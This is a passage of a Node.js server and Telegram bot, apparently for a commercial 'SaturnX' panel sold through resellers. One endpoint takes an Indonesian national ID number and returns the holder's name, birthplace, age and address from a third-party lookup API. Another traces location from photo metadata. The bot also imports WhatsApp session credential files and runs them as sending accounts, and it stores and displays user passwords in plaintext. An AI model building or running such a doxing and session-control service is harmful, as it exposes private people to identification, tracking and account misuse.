    if ((now - (t.created || now)) > 48 * 3600 * 1000) nikTasks.delete(id);
  }
}, 3600 * 1000); // tiap jam

// POST start job
app.post('/api/parse-nik', requireAuth, async (req, res) => {
  try {
    console.log('[parse-nik] incoming request from ip=', req.ip, 'auth=', !!req.headers.authorization, 'device=', req.headers['x-device-id']);
    const { nik } = req.body || {};
    const cleanNik = String(nik || '').trim();
    if (!/^\d{16}$/.test(cleanNik)) {
      return res.status(400).json({ ok:false, error: 'NIK harus 16 digit angka' });
    }

    // buat task id
    const taskId = Date.now().toString(36) + Math.random().toString(36).slice(2,10);
    const task = { status: 'pending', created: Date.now(), updated: Date.now(), nik: cleanNik };
    nikTasks.set(taskId, task);

    // jalankan job background (tidak blocking response)
    (async () => {
      try {
        const apiUrl = `https://api.siputzx.my.id/api/tools/nik-checker?nik=${encodeURIComponent(cleanNik)}`;
        const response = await axios.get(apiUrl, { timeout: 1800000, headers: { Accept: 'application/json', 'User-Agent': 'SaturnX-Panel/1.0' } });

        // normalize response
        const body = response.data || {};
        if (!body?.status || !body?.data) {
          nikTasks.set(taskId, { ...task, status: 'error', updated: Date.now(), error: 'API tidak mengembalikan data valid' });
          return;
        }

        const outer = body.data || {};
        const detail = outer.data || {};
        const meta = outer.metadata || {};

        const normalized = {
          ok: true,
          nik: outer.nik || cleanNik,
          status: outer.status || body.status || 'unknown',
          nama: detail.nama || '-',
          gender: detail.kelamin || detail.gender || '-',
          tempatLahir: detail.tempat_lahir || detail.tempatLahir || '-',
          usia: detail.usia || '-',
          provinsi: detail.provinsi || '-',
          kabupaten: detail.kabupaten || detail.kota || '-',
          kecamatan: detail.kecamatan || '-',
          kelurahan: detail.kelurahan || '-',
          alamat: detail.alamat || '-',
          zodiak: detail.zodiak || '-',
          ultahMendatang: detail.ultah_mendatang || '-',
          pasaran: detail.pasaran || '-',
          nomorUrut: meta.nomor_urut || meta.nomorUrut || '-',
          kategoriUsia: meta.kategori_usia || meta.kategoriUsia || '-',
          jenisWilayah: meta.jenis_wilayah || meta.jenisWilayah || '-',
          kodeWilayah: meta.kode_wilayah || meta.kodeWilayah || '-',
          timestamp: meta.timestamp || body.timestamp || new Date().toISOString()
        };

        nikTasks.set(taskId, { ...task, status: 'done', updated: Date.now(), data: normalized });
      } catch (err) {
        console.error('parse-nik background error:', err?.message || err);
        nikTasks.set(taskId, { ...task, status: 'error', updated: Date.now(), error: (err?.message || 'Unknown error') });
      }
    })();

    // langsung balas ke frontend
    return res.json({ ok:true, taskId, message: 'Permintaan diproses di background. Periksa status menggunakan taskId.' });

  } catch (err) {
    console.error('parse-nik start error:', err?.message || err);
    return res.status(500).json({ ok:false, error: 'Gagal memulai proses NIK' });
  }
});

// GET status/result
app.get('/api/parse-nik/status/:taskId', requireAuth, (req, res) => {
  try {
    const taskId = req.params.taskId;
    const task = nikTasks.get(taskId);
    if (!task) return res.status(404).json({ ok:false, error: 'Task tidak ditemukan' });
   console.log('[parse-nik/status] request taskId=', req.params.taskId, 'from=', req.ip, 'auth=', !!req.headers.authorization);

    // kembalikan status & data/error jika ada
    const payload = { status: task.status, updated: task.updated };
    if (task.status === 'done') payload.data = task.data;
    if (task.status === 'error') payload.error = task.error;
    return res.json(payload);
  } catch (err) {
    console.error('parse-nik status error:', err?.message || err);
    return res.status(500).json({ ok:false, error: 'Gagal mengambil status' });
  }
});
//ENDPOINT LACAK LOKASI VIA FOTO
// LACAK LOKASI VIA FOTO (AMAN & AUTO-CLEAN)
app.post('/api/photo/location', requireAuth, upload.single('photo'), async (req, res, next) => {
  let bufRef; // pegang referensi utk dibersihkan
  try {
    if (!req.file) return res.status(400).json({ error: 'Tidak ada file' });

    const { buffer, originalname } = req.file;
    bufRef = buffer; // simpan referensi

    // Proses metadata dari buffer (fungsi buildMeta sudah ada di file kamu)
    const result = await buildMeta(buffer, originalname);

    // === CLEANUP MEMORY ===
    try {
      if (bufRef && Buffer.isBuffer(bufRef)) bufRef.fill(0); // kosongkan isi buffer
      if (req.file) {
        req.file.buffer = null;
        // hapus properti besar agar cepat di-GC
        delete req.file.buffer;
        delete req.file;
      }
      bufRef = null;
      if (typeof global.gc === 'function') global.gc(); // aktif jika Node start dg --expose-gc
    } catch (e) {
      console.warn('Cleanup warn:', e.message);
    }

    return res.json(result);

  } catch (err) {
    // Pastikan di jalur error juga dibersihkan
    try {
      if (bufRef && Buffer.isBuffer(bufRef)) bufRef.fill(0);
      if (req.file) {
        req.file.buffer = null;
        delete req.file.buffer;
        delete req.file;
      }
      bufRef = null;
      if (typeof global.gc === 'function') global.gc();
    } catch {}
    next(err);
  }
});

// Heartbeat supaya user dihitung online
app.post('/api/ping', requireAuth, (req, res) => {
  const u = req.user?.username || req.user?.id || req.ip;
  onlineUsers.set(u, Date.now());
  res.json({ ok: true });
});

// Stats untuk dashboard
app.get('/api/stats', requireAuth, (req, res) => {
  pruneOnlineUsers();
  res.json({
    users: onlineUsers.size,       // jumlah user online
    senders: countActiveSenders()  // jumlah sender aktif
  });
});

// LOGIN + DEVICE BINDING (1 user = 1 device)
app.post('/api/login', (req, res) => {
  const { username, password, deviceId, force } = req.body; // <- deviceId WAJIB, force opsional
  if (!deviceId) {
    return res.status(400).json({ success: false, message: 'deviceId is required' });
  }

  const accounts = loadAccounts();
  const user = accounts.find(acc => acc.username === username && acc.password === password);

  if (!user) {
    return res.status(401).json({ success: false, message: 'Invalid credentials' });
  }

  // cek expired (logika kamu dipertahankan)
  if (isAccountExpired(user.expired)) {
    const updatedAccounts = accounts.filter(acc => acc.username !== username);
    fs.writeFileSync('./acc.json', JSON.stringify(updatedAccounts, null, 2));
    return res.status(401).json({ success: false, message: 'Account has expired' });
  }

  // BINDING DEVICE
  if (!user.deviceId) {
    // pertama kali login → ikat ke device ini
    user.deviceId = deviceId;
    saveAccounts(accounts);
  } else if (user.deviceId !== deviceId) {
    // sudah terikat ke device lain
    if (!force) {
      return res.status(403).json({
        success: false,
        message: 'Account already bound to another device.'
      });
    }
    // (disarankan tambahkan OTP/email verifikasi di sini)
    user.deviceId = deviceId; // pindahkan binding ke device baru
    saveAccounts(accounts);
  }

  // normalisasi role
  const role = ((user.role || 'USER').toUpperCase());
  const validRole = ['ADMIN', 'VIP', 'USER', 'DEV'].includes(role) ? role : 'USER';

  // token harus membawa deviceId juga
  const token = generateToken({ ...user, role: validRole, deviceId: user.deviceId });

  return res.json({
    success: true,
    token,
    user: {
      username: user.username,
      role: validRole,
      expired: user.expired,
      deviceId: user.deviceId
    }
  });
});

const saveActive = (botNumber) => {
  const list = fs.existsSync(file_session) ? JSON.parse(fs.readFileSync(file_session)) : [];
  if (!list.includes(botNumber)) {
    list.push(botNumber);
    fs.writeFileSync(file_session, JSON.stringify(list));
  }
};

const sessionPath = (botNumber) => {
  const dir = path.join(sessions_dir, `device${botNumber}`);
  if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
  return dir;
};

const initializeWhatsAppConnections = async () => {
  if (!fs.existsSync(file_session)) return;
  const activeNumbers = JSON.parse(fs.readFileSync(file_session));
  console.log(`Ditemukan ${activeNumbers.length} sesi WhatsApp aktif`);

  for (const botNumber of activeNumbers) {
    console.log(`Menghubungkan WhatsApp: ${botNumber}`);
    const sessionDir = sessionPath(botNumber);
    const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

    const sock = makeWASocket({
      auth: state,
      printQRInTerminal: true,
      logger: pino({ level: "silent" }),
      defaultQueryTimeoutMs: undefined,
    });

    sock.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
      if (connection === "open") {
        console.log(`Bot ${botNumber} terhubung!`);
        sessions.set(botNumber, sock);
      }
      if (connection === "close") {
        const reconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
        if (reconnect) {
          console.log(`Koneksi ditutup untuk ${botNumber}, mencoba menghubungkan kembali...`);
          sessions.delete(botNumber);
          await connectToWhatsApp(botNumber, null, null);
        } else {
          console.log(`Sesi ${botNumber} keluar.`);
          sessions.delete(botNumber);
          fs.rmSync(sessionDir, { recursive: true, force: true });
          const data = fs.existsSync(file_session) ? JSON.parse(fs.readFileSync(file_session)) : [];
          const updated = data.filter(n => n !== botNumber);
          fs.writeFileSync(file_session, JSON.stringify(updated));
        }
      }
    });
    sock.ev.on("creds.update", saveCreds);
  }
};

const connectToWhatsApp = async (botNumber, chatId, ctx) => {
  const sessionDir = sessionPath(botNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  let statusMessage;
  if (ctx) {
    statusMessage = await ctx.reply(`pairing with number *${botNumber}*...`, {
      parse_mode: "Markdown"
    });
  }

  const editStatus = async (text) => {
    if (ctx && chatId && statusMessage) {
      try {
        await ctx.telegram.editMessageText(chatId, statusMessage.message_id, null, text, {
          parse_mode: "Markdown"
        });
      } catch (e) {
        console.error("Gagal edit pesan:", e.message);
      }
    } else {
      console.log(text);
    }
  };

  let paired = false;

  const sock = makeWASocket({
    auth: state,
    printQRInTerminal: false,
    logger: pino({ level: "silent" }),
    defaultQueryTimeoutMs: undefined,
  });

  sock.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
    if (connection === "connecting") {
      if (!fs.existsSync(`${sessionDir}/creds.json`)) {
        setTimeout(async () => {
          try {
            const code = await sock.requestPairingCode(botNumber);
            const formatted = code.match(/.{1,4}/g)?.join("-") || code;
            await editStatus(makeCode(botNumber, formatted));
          } catch (err) {
            console.error("Error requesting code:", err);
            await editStatus(makeStatus(botNumber, `❗ ${err.message}`));
          }
        }, 3000);
      }
    }

    if (connection === "open" && !paired) {
      paired = true;
      sessions.set(botNumber, sock);
      saveActive(botNumber);
      await editStatus(makeStatus(botNumber, "✅ Connected successfully."));
    }

    if (connection === "close") {
      const code = lastDisconnect?.error?.output?.statusCode;
      if (code !== DisconnectReason.loggedOut && code >= 500) {
        console.log(`Reconnect diperlukan untuk ${botNumber}`);
        setTimeout(() => connectToWhatsApp(botNumber, chatId, ctx), 2000);
      } else {
        await editStatus(makeStatus(botNumber, "❌ Failed to connect."));
        fs.rmSync(sessionDir, { recursive: true, force: true });
        sessions.delete(botNumber);
        const data = fs.existsSync(file_session) ? JSON.parse(fs.readFileSync(file_session)) : [];
        const updated = data.filter(n => n !== botNumber);
        fs.writeFileSync(file_session, JSON.stringify(updated));
      }
    }
  });

  sock.ev.on("creds.update", saveCreds);
  return sock;
};

const makeStatus = (number, status) =>
  `*Status Pairing*\nNomor: \`${number}\`\nStatus: ${status}`;

const makeCode = (number, code) =>
  `*Kode Pairing*\nNomor: \`${number}\`\nKode: \`${code}\``;
  
// ====================== BOT TELEGRAM ======================
bot.use(async (ctx, next) => {
  const resownData = loadResown();
  ctx.isOwner = resownData.owners.includes(ctx.from?.id?.toString());
  // Perubahan di sini: Mengecek apakah ID ada di array reseller
  ctx.isReseller = resownData.resellers.includes(ctx.from?.id?.toString());
  return next();
});

bot.start((ctx) => {
  ctx.replyWithVideo(
    { url: 'https://files.catbox.moe/tcv2pi.mp4' },
    {
      caption: `
━──────────────────────────────━
            𝘿𝙧𝙖𝙫𝙫𝙘𝙩 𝘾𝙤𝙣𝙩𝙧𝙤𝙡𝙡𝙚𝙧
━──────────────────────────────━
━──────────────────────────────━
 /create username password role expired
 /listakun
 /delakun username
 /pairing number
 /listpairing
 /delpairing number
 /addowner
 /delowner
 /addreseller
 /delresseler
 /listowner
 /listresseler
 /add (sambil reply creds.json) 
 /pricelist
 /lupapass username
 /lihatpw (owner only) 
 /maintenance on/off/status
 /setapikey
 /setdomain
 /csessions scan
 /mulaicek (kirim status server ke ch info)
━──────────────────────────────━
`,
      parse_mode: 'Markdown',
      ...Markup.inlineKeyboard([
        [Markup.button.url('👤 Owner', 'https://t.me/RoufzzzNotDev')],
        [Markup.button.url('📢 Join Channel', 'https://t.me/informasihdravvctinvistus')]
      ])
    }
  );
});
// === HANDLER UNTUK /mulaicek ===
bot.command('mulaicek', async (ctx) => {
    if (!ctx.isOwner) return ctx.reply("❌ Anda tidak memiliki akses untuk Command ini.");   
  const chatId = ctx.chat.id;
  const status = getServerStatus();
  const accounts = loadAccounts(); // ambil data akun terbaru
  
  const header = !maintenanceMode
    ? `🛰️ *SaturnX Server Monitor*\n━━━━━━━━━━━━━━━━━━━\n🟢 *STATUS:* Online ✅`
    : `🛰️ *SaturnX Server Monitor*\n━━━━━━━━━━━━━━━━━━━\n🔴 *STATUS:* Maintenance ⚙️`;

  const body = `
🕓 *Time:* ${status.time}
📶 *Ping:* ~${status.ping}ms
🧠 *RAM:* ${status.ram} MB
💻 *CPU:* ${status.cpu}
⏱️ *Uptime:* ${status.uptime}
📁 *DB Entries:* ${accounts.length}
`;

  const footer = !maintenanceMode
    ? `━━━━━━━━━━━━━━━━━━━\n🟢 *Server berjalan dengan normal.*\nSegalanya tampak stabil 🚀`
    : `━━━━━━━━━━━━━━━━━━━\n⚙️ *Sedang perawatan rutin.*\nMohon bersabar, tim sedang bekerja 👨‍💻`;

  const text = `${header}\n${body}\n${footer}`;

  // Kirim ke grup
  await ctx.telegram.sendMessage(-1002710223649, text, { parse_mode: 'Markdown' });

  // Balas ke pengirim juga
  await ctx.reply('✅ Status server berhasil dikirim ke grup!');
});

bot.command("addowner", async (ctx) => {
    if (!ctx.isOwner) return ctx.reply("❌ Anda tidak memiliki akses untuk menambahkan Owner.");
    
    const args = ctx.message.text.split(" ");
    if (args.length < 2) return ctx.reply("Gunakan: `/addowner <ID_Telegram_Baru>`", { parse_mode: "Markdown" });
    
    const newOwnerId = args[1];
    const resownData = loadResown();

    if (resownData.owners.includes(newOwnerId)) {
        return ctx.reply(`❌ ID Telegram \`${newOwnerId}\` sudah terdaftar sebagai Owner.`, { parse_mode: "Markdown" });
    }

    resownData.owners.push(newOwnerId);
    saveResown(resownData);
    ctx.reply(`✅ ID Telegram \`${newOwnerId}\` berhasil ditambahkan sebagai Owner.`, { parse_mode: "Markdown" });
});

// ID admin yang boleh ON/OFF (pakai Number, bukan string)
const allowedAdmins = [6304082972]; 

bot.command("maintenance", async (ctx) => {
  const raw = ctx.message?.text || "";
  const args = raw.split(" ").slice(1);
  const action = (args[0] || "").toLowerCase();

  // status: bebas untuk siapa saja
  if (action === "status" || action === "") {
    return ctx.reply(`ℹ️ Maintenance Status: ${maintenanceMode ? "ON" : "OFF"}`);
  }

  // on/off: hanya untuk admin tertentu
  const isAllowed = allowedAdmins.includes(ctx.from.id);
  if (!isAllowed) {
    return ctx.reply("❌ Kamu tidak punya izin untuk perintah ini.");
  }

  if (action === "on") {
    maintenanceMode = true;
    return ctx.reply("🔧 Maintenance mode ENABLED. Apk Sementara tidak bisa diakses.");
  }

  if (action === "off") {
    maintenanceMode = false;
    return ctx.reply("✅ Maintenance mode DISABLED. Apk kembali normal.");
  }

  // bantuan jika argumen tidak valid
  return ctx.reply("Usage:\n/maintenance on\n/maintenance off\n/maintenance status");
});
// /lupapass <username>  (PRIVATE ONLY, semua user boleh request, notif ke owner)
bot.command('lupapass', async (ctx) => {
  try {
    if (!ensurePrivate(ctx)) return;

    const raw = (ctx.message?.text || '').trim();
    const args = raw.split(/\s+/).slice(1);
    const username = (args[0] || '').trim();
    const contact  = args.slice(1).join(' ').trim()
                      || `@${ctx.from?.username || ''}`.replace(/@$/, '')
                      || String(ctx.from?.id || '');

    if (!username) {
      return ctx.reply('Format: `/lupapass <username> [kontak opsional]`', { parse_mode: 'Markdown' });
    }

    // Rate limit sederhana
    const key = String(ctx.from?.id || '');
    const now = Date.now();
    const rec = lastForgotReq.get(key) || { ts: now, cnt: 0 };
    if (now - rec.ts > FORGOT_WINDOW_MS) { rec.ts = now; rec.cnt = 0; }
    if (rec.cnt >= FORGOT_MAX) return ctx.reply('Terlalu sering. Coba lagi nanti.');
    rec.cnt++; lastForgotReq.set(key, rec);

    // Info lingkungan (best effort)
    const deviceId = '-(via bot)-';
    const ip = '-';
    const ua = `tg:${ctx.from?.id}`;

    await notifyOwnersForgotPW({ username, from: contact, deviceId, ip, ua });

    // Balasan generik (tidak bocorkan apakah akun ada/tidak)
    return ctx.reply(`Jika akun *${mask(username)}* terdaftar, admin akan menghubungi Anda untuk reset.`, { parse_mode: 'Markdown' });
  } catch (e) {
    console.error('/lupapass error:', e);
    return ctx.reply('Terjadi kesalahan. Coba lagi nanti.');
  }
});
// === /set-domain ===
bot.command("setdomain", async (ctx) => {
  try {
    if (!ctx.isOwner) return ctx.reply("❌ Hanya owner yang bisa pakai command ini.");
    const args = ctx.message.text.trim().split(/\s+/);

    if (args.length < 2) {
      return ctx.reply("Gunakan: /set-domain <url>");
    }

    const domain = args[1].trim();

    // Validasi format
    if (!/^https?:\/\//i.test(domain)) {
      return ctx.reply("❌ Format domain tidak valid!\nContoh: https://panel.example.com");
    }

    // Simpan ke config
    updateConfig({ domain });

    await ctx.reply(`🌍 Domain panel diset ke: <code>${domain}</code>`, { parse_mode: "HTML" });
  } catch (err) {
    console.error("Error setdomain:", err);
    ctx.reply("❌ Terjadi kesalahan saat set domain!");
  }
});

// === /setapikey ===
bot.command("setapikey", async (ctx) => {
  if (!ctx.isOwner) return ctx.reply("❌ Hanya owner yang bisa pakai command ini.");
  const args = ctx.message.text.trim().split(/\s+/);
  if (args.length < 2) return ctx.reply("Gunakan: `/setapikey <api_key>`", { parse_mode: "Markdown" });

  const apikey = args[1];
  if (apikey.length < 10) return ctx.reply("❌ API Key tidak valid!");

  updateConfig({ apikey });
  ctx.reply("🔑 API Key panel berhasil diset ✅");
});

// /lihatpw <username>  (PRIVATE ONLY + OWNER ONLY)
bot.command('lihatpw', async (ctx) => {
  try {
    if (!ensurePrivate(ctx)) return;
    if (!ctx.isOwner) return ctx.reply('❌ Hanya owner yang boleh pakai command ini.');

    const raw = (ctx.message?.text || '').trim();
    const args = raw.split(/\s+/).slice(1);
    const username = (args[0] || '').trim();
    if (!username) {
      return ctx.reply('Gunakan: `/lihatpw <username>`', { parse_mode: 'Markdown' });
    }

    const acc = loadAccounts(); // fungsi ini sudah ada di project kamu
    const user = acc.find(u => (u.username || '').toLowerCase() === username.toLowerCase());
    if (!user) return ctx.reply('❌ User tidak ditemukan.');

    const stored = user.password;
    let pwDisplay;
    if (!stored) {
      pwDisplay = '❓ Field password kosong/tidak ada.';
    } else if (typeof stored === 'string' && stored.startsWith('$2')) {
      // bcrypt hash — tidak bisa di-recover
      pwDisplay = [
        '🔒 Password tersimpan *bcrypt-hash* (tidak bisa dibalik).',
        `Hash (potongan): \`${stored.slice(0, 25)}...\``
      ].join('\n');
    } else {
      // plaintext (legacy)
      pwDisplay = `🔑 Password: \`${stored}\``;
    }

    const text = [
      '*Lihat Password*',
      `👤 Username: \`${user.username}\``,
      pwDisplay
    ].join('\n');

    const sent = await ctx.reply(text, { parse_mode: 'Markdown' });

    // Auto-delete 30 detik (pesan bot & command user)
    setTimeout(() => ctx.deleteMessage(sent.message_id).catch(() => {}), 30_000);
    setTimeout(() => ctx.deleteMessage(ctx.message.message_id).catch(() => {}), 30_000);

  } catch (e) {
    console.error('/lihatpw error:', e);
    ctx.reply('⚠️ Terjadi kesalahan.');
  }
});

bot.command("delowner", async (ctx) => {
    if (!ctx.isOwner) return ctx.reply("❌ Anda tidak memiliki akses.");
    
    const args = ctx.message.text.split(" ");
    if (args.length < 2) return ctx.reply("Gunakan: `/delowner <ID_Telegram_Owner>`", { parse_mode: "Markdown" });
    
    const ownerIdToDelete = args[1];
    const resownData = loadResown();

    // Pastikan tidak menghapus owner utama dari config.js
    if (ownerIdToDelete === owner) {
        return ctx.reply("❌ Anda tidak bisa menghapus Owner utama yang terdaftar di konfigurasi.");
    }

    const initialLength = resownData.owners.length;
    resownData.owners = resownData.owners.filter(id => id !== ownerIdToDelete);

    if (resownData.owners.length === initialLength) {
        return ctx.reply(`❌ ID Telegram \`${ownerIdToDelete}\` tidak ditemukan di daftar Owner.`, { parse_mode: "Markdown" });
    }

    saveResown(resownData);
    ctx.reply(`✅ ID Telegram \`${ownerIdToDelete}\` berhasil dihapus dari daftar Owner.`, { parse_mode: "Markdown" });
});

bot.command("listowner", (ctx) => {
    if (!ctx.isOwner) return ctx.reply("❌ Anda tidak memiliki akses.");

    const resownData = loadResown();
    if (resownData.owners.length === 0) {
        return ctx.reply("Tidak ada Owner terdaftar.");
    }

    const list = resownData.owners.map((id, index) => `${index + 1}. \`${id}\``).join("\n");
    ctx.reply(`*Daftar Owner:*\n${list}`, { parse_mode: "Markdown" });
});
// Helper untuk mencari creds.json dalam folder
async function findCredsFile(dir) {
  const files = fs.readdirSync(dir, { withFileTypes: true });
  for (const file of files) {
    const fullPath = path.join(dir, file.name);
    if (file.isDirectory()) {
      const result = await findCredsFile(fullPath);
      if (result) return result;
    } else if (file.name === "creds.json") {
      return fullPath;
    }
  }
  return null;
}

// ===== Command /add =====
bot.command("add", async (ctx) => {
  const userId = ctx.from.id.toString();
  if (!ctx.isOwner) return ctx.reply("❌ Anda tidak memiliki akses untuk menambahkan Reseller.");

  const reply = ctx.message.reply_to_message;
  if (!reply || !reply.document) {
    return ctx.reply("❌ Balas file session dengan perintah /add");
  }

  const doc = reply.document;
  const name = doc.file_name.toLowerCase();
  if (![".json", ".zip", ".tar", ".tar.gz", ".tgz"].some(ext => name.endsWith(ext))) {
    return ctx.reply("❌ File bukan session yang valid (.json/.zip/.tar/.tgz)");
  }

  await ctx.reply("🔄 Memproses session…");

  try {
    const link = await ctx.telegram.getFileLink(doc.file_id);
    const { data } = await axios.get(link.href, { responseType: "arraybuffer" });
    const buf = Buffer.from(data);
    const tmp = await fse.mkdtemp(path.join(os.tmpdir(), "sess-"));

    if (name.endsWith(".json")) {
      await fse.writeFile(path.join(tmp, "creds.json"), buf);
    } else if (name.endsWith(".zip")) {
      new AdmZip(buf).extractAllTo(tmp, true);
    } else {
      const tmpTar = path.join(tmp, name);
      await fse.writeFile(tmpTar, buf);
      await tar.x({ file: tmpTar, cwd: tmp });
    }

    const credsPath = await findCredsFile(tmp);
    if (!credsPath) {
      return ctx.reply("❌ creds.json tidak ditemukan di dalam file.");
    }

    const creds = await fse.readJson(credsPath);
    const botNumber = creds.me.id.split(":")[0];
    const destDir = sessionPath(botNumber);

    await fse.remove(destDir);
    await fse.copy(tmp, destDir);
    saveActive(botNumber);

    await connectToWhatsApp(botNumber, ctx.chat.id, ctx);

    return ctx.reply(`✅ Session *${botNumber}* berhasil ditambahkan & online.`, { parse_mode: "Markdown" });
  } catch (err) {
    console.error("❌ Error add session:", err);
    return ctx.reply(`❌ Gagal memproses session.\nError: ${err.message}`);
  }
});
bot.command("addreseller", async (ctx) => {
    if (!ctx.isOwner) return ctx.reply("❌ Anda tidak memiliki akses untuk menambahkan Reseller.");
    
    const args = ctx.message.text.split(" ");
    if (args.length < 2) return ctx.reply("Gunakan: `/addreseller <ID_Telegram_Reseller>`", { parse_mode: "Markdown" });
    
    const newResellerId = args[1];
    const resownData = loadResown();

    // Perubahan di sini: Mengecek apakah ID sudah ada di array reseller
    if (resownData.resellers.includes(newResellerId)) {
        return ctx.reply(`❌ ID Telegram \`${newResellerId}\` sudah terdaftar sebagai Reseller.`, { parse_mode: "Markdown" });
    }

    // Perubahan di sini: Menambahkan ID langsung ke array
    resownData.resellers.push(newResellerId);
    saveResown(resownData);
    ctx.reply(`✅ ID Telegram \`${newResellerId}\` berhasil ditambahkan sebagai Reseller.`, { parse_mode: "Markdown" });
});

bot.command("delreseller", async (ctx) => {
    if (!ctx.isOwner) return ctx.reply("❌ Anda tidak memiliki akses.");
    
    const args = ctx.message.text.split(" ");
    if (args.length < 2) return ctx.reply("Gunakan: `/delreseller <ID_Telegram_Reseller>`", { parse_mode: "Markdown" });
    
    const resellerIdToDelete = args[1];
    const resownData = loadResown();

    const initialLength = resownData.resellers.length;
    // Perubahan di sini: Menghapus ID dari array
    resownData.resellers = resownData.resellers.filter(id => id !== resellerIdToDelete);

    if (resownData.resellers.length === initialLength) {
        return ctx.reply(`❌ ID Telegram \`${resellerIdToDelete}\` tidak ditemukan di daftar Reseller.`, { parse_mode: "Markdown" });
    }

    saveResown(resownData);
    ctx.reply(`✅ ID Telegram \`${resellerIdToDelete}\` berhasil dihapus dari daftar Reseller.`, { parse_mode: "Markdown" });
});
// ====== /pricelist (bisa di grup & private) ======
bot.command(["pricelist", "price", "harga"], async (ctx) => {
  try {
    await ctx.reply(PRICE_TEXT_HTML, {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            { text: "🛒 Order Sekarang", url: ORDER_URL },
            { text: "📣 Channel Info Update", url: CHANNEL_URL }
          ]
        ]
      }
    });
  } catch (err) {
    console.error("/pricelist error:", err);
  }
});
bot.command("create", async (ctx) => {
  // 🔐 Hanya owner atau reseller
  if (!ctx.isOwner && !ctx.isReseller) return ctx.reply("❌ Anda tidak memiliki akses.");

  const chatType = ctx.chat.type; // "private", "group", "supergroup"
  const args = ctx.message.text.trim().split(/\s+/);

  // ✅ Sekarang format /create disederhanakan
  if (args.length < 4) {
    return ctx.reply(
`Gunakan: \`/create <username> <role> <expired>\`

🔑 *Password akan dibuat otomatis oleh bot*
*Peran yang valid:* ADMIN, VIP, USER
*Format Expired:* 1d=1 hari, 1h=1 jam, 1m=1 bulan, 1y=1 tahun
*Contoh:* \`/create user123 VIP 30d\``,
      { parse_mode: "Markdown" }
    );
  }

  // 🧩 Ambil argumen
  const [, username, roleRaw, expiredRaw] = args;

  // 🔐 Password otomatis
  const crypto = require("crypto");
  const randomPart = crypto.randomBytes(3).toString("hex"); // contoh: a3f9b1
  const password = `${randomPart}SaturnX`; // hasil: a3f9b1SaturnX

  const role = roleRaw.toUpperCase();
  const expired = expiredRaw || "";

  // ✅ Validasi role
  const validRoles = ["ADMIN", "VIP", "USER", 'DEV'];
  if (!validRoles.includes(role)) {
    return ctx.reply("❌ Peran tidak valid! Gunakan: ADMIN, VIP, atau USER");
  }

  // 🚫 Cek user sudah start bot (khusus grup)
  if (chatType !== "private") {
    try {
      await bot.telegram.sendMessage(ctx.from.id, "✅ Kamu sudah aktif di bot. Proses pembuatan akun dilanjutkan.");
    } catch (err) {
      return ctx.reply(
        `⚠️ @${ctx.from.username || ctx.from.first_name}, silakan *Start* bot di private chat dulu ya: t.me/${process.env.BOT_USERNAME}`,
        { parse_mode: "Markdown" }
      );
    }
  }

  // 💾 Muat & cek akun
  const accounts = loadAccounts();
  if (accounts.find((acc) => acc.username === username)) {
    return ctx.reply("❌ Username sudah ada.");
  }

  // ⏰ Validasi expired
  if (expired && !/^(\d+)([dhmy])$/i.test(expired)) {
    return ctx.reply("❌ Format expired tidak valid! Gunakan: 1d, 1h, 1m, 1y (d=hari, h=jam, m=bulan, y=tahun)");
  }

  // 🧠 Simpan akun baru
  accounts.push({
    username,
    password,
    role,
    expired
  });
  fs.writeFileSync("./acc.json", JSON.stringify(accounts, null, 2));

  const expiryText = expired ? `Kadaluarsa dalam: ${expired}` : "Tidak pernah kadaluarsa";

  // 📩 Balasan ke pembuat
  await ctx.reply(
`━─────────────────────━
      𝐀𝐂𝐂𝐎𝐔𝐍𝐓 𝐍𝐎𝐓𝐈𝐅𝐘
━─────────────────────━
✅ Account created successfully!
👤 Username: \`${username}\`
🔑 Password: \`${password}\`
👑 Role: \`${role}\`
⏰ ${expiryText}
━─────────────────────━`,
    { parse_mode: "Markdown" }
  );

  // 📢 Notifikasi ke semua owner
  try {
    const resown = loadResown();
    const allOwners = Array.isArray(resown.owners) ? resown.owners : [];
    if (allOwners.length) {
      const creatorId = ctx.from?.id?.toString() || "unknown";
      const creatorHandle = ctx.from?.username
        ? `@${ctx.from.username}`
        : (ctx.from?.first_name || "unknown");
      const level = ctx.isOwner ? "Owner" : (ctx.isReseller ? "Reseller" : "User");

      const notif =
`━─────────────────────━
        𝐀𝐂𝐂 𝐂𝐑𝐄𝐀𝐓𝐄 𝐋𝐎𝐆
━─────────────────────━
👤 Pembuat   : ${creatorHandle} (ID: \`${creatorId}\`)
🔐 Level     : ${level}
📛 Username  : \`${username}\`
👑 Role      : \`${role}\`
⏰ ${expiryText}
🕒 Waktu     : ${new Date().toLocaleString("id-ID")}
━─────────────────────━`;

      for (const ownerId of allOwners) {
        try {
          await bot.telegram.sendMessage(ownerId, notif, { parse_mode: "Markdown" });
        } catch (err) {
          console.error(`Gagal kirim notifikasi ke owner ${ownerId}:`, err.message);
        }
      }
    }
  } catch (e) {
    console.error("Gagal mengirim notifikasi create:", e.message);
  }
});

bot.command("listakun", (ctx) => {
  if (!ctx.isOwner && !ctx.isReseller) return ctx.reply("❌ Anda tidak memiliki akses.");

  const accounts = loadAccounts();
  if (accounts.length === 0) {
    return ctx.reply("Tidak ada akun ditemukan.");
  }

  const list = accounts.map((acc, index) => 
    `${index + 1}. ${acc.username} (${acc.role}) - ${acc.expired || "Tidak pernah kadaluarsa"}`
  ).join("\n");

  ctx.reply(`*Daftar Akun:*\n${list}`, { parse_mode: "Markdown" });
});

bot.command("delakun", async (ctx) => {
  if (!ctx.isOwner && !ctx.isReseller) return ctx.reply("❌ Anda tidak memiliki akses.");

  const args = ctx.message.text.split(" ");
  if (args.length < 2) return ctx.reply("Gunakan: /delakun <username>");

  const username = args[1];
  const accounts = loadAccounts();
  const initialLength = accounts.length;
  const updatedAccounts = accounts.filter(acc => acc.username !== username);

  if (updatedAccounts.length === initialLength) {
    return ctx.reply("❌ Username tidak ditemukan.");
  }

  fs.writeFileSync('./acc.json', JSON.stringify(updatedAccounts, null, 2));
  ctx.reply(`✅ Akun ${username} berhasil dihapus.`);
});

bot.command("pairing", async (ctx) => {
  if (!ctx.isOwner) return ctx.reply("❌ Anda tidak memiliki akses.");
  const args = ctx.message.text.split(" ");
